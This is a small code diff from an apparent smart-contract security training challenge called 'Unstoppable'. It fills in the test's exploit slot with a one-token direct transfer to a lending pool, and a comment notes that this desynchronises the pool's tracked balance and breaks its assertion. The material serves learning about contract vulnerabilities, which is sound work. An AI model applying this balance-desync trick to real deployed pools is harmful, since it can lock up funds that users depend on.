@@ -40,6 +40,9 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        this.token.transfer(this.pool.address, 1);
+        // sending money will increase the pool without updating poolBalance, breaking assert.
+        //what happens if we use transferFrom?
     });
 
     after(async function () {
